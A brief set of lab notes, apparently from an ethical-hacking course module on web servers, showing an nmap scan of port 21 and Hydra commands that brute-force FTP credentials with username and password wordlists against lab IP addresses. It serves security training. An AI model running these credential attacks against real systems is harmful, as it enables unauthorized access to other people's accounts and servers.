# 13 - Hacking Web Servers

## Module 13 - Hacking Web Servers

FTP Bruteforce with Hydra

* `hydra -L /root/Desktop/Wordlists/Usernames.txt -P /root/Desktop/Wordlists/Passwords.txt ftp://10.10.10.11`

### **Lab2-Task1: Crack FTP Credentials using a Dictionary Attack**

* nmap -p 21 **\<Target IP>**
* **hydra -L usernames.txt -P passwords.txt ftp://10.10.10.10**
